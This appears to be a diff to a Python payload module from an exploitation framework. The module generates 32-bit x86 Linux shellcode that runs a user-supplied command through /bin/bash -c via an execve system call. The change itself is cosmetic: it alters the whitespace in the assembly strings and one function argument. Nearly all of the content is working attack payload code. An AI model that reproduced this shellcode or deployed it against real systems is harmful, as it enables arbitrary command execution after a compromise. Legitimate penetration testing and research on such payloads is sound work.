@@ -20,35 +20,35 @@ class Module(base_module.BasePayload):
     command = base_module.OptString("", "Command to execute")
 
     def generate(self):
-        payload = "push   $0xb\n"
-        payload += "pop    %eax\n"
+        payload = "push $0xb\n"
+        payload += "pop %eax\n"
         payload += "cltd\n"
-        payload += "push   %edx\n"
+        payload += "push %edx\n"
         payload += stack.generate(self.command, '%ecx', 'string')
-        payload += "mov    %esp, %esi\n"
-        payload += "push   %edx\n"
-        payload += "push   $0x632d9090\n"
-        payload += "pop    %ecx\n"
-        payload += "shr    $0x10, %ecx\n"
-        payload += "push   %ecx\n"
-        payload += "mov    %esp, %ecx\n"
-        payload += "push   %edx\n"
-        payload += "push   $0x68\n"
-        payload += "push   $0x7361622f\n"
-        payload += "push   $0x6e69622f\n"
-        payload += "mov    %esp, %ebx\n"
-        payload += "push   %edx\n"
-        payload += "push   %edi\n"
-        payload += "push   %esi\n"
-        payload += "push   %ecx\n"
-        payload += "push   %ebx\n"
-        payload += "mov    %esp, %ecx\n"
-        payload += "int    $0x80"
+        payload += "mov %esp, %esi\n"
+        payload += "push %edx\n"
+        payload += "push $0x632d9090\n"
+        payload += "pop %ecx\n"
+        payload += "shr $0x10, %ecx\n"
+        payload += "push %ecx\n"
+        payload += "mov %esp, %ecx\n"
+        payload += "push %edx\n"
+        payload += "push $0x68\n"
+        payload += "push $0x7361622f\n"
+        payload += "push $0x6e69622f\n"
+        payload += "mov %esp, %ebx\n"
+        payload += "push %edx\n"
+        payload += "push %edi\n"
+        payload += "push %esi\n"
+        payload += "push %ecx\n"
+        payload += "push %ebx\n"
+        payload += "mov %esp, %ecx\n"
+        payload += "int $0x80"
         return payload
 
     def run(self):
         if not self.command:
             alert.error("A command is required.")
             return
-        self.handle_generate(arch=__name__)
+        self.handle_generate(__name__)
 
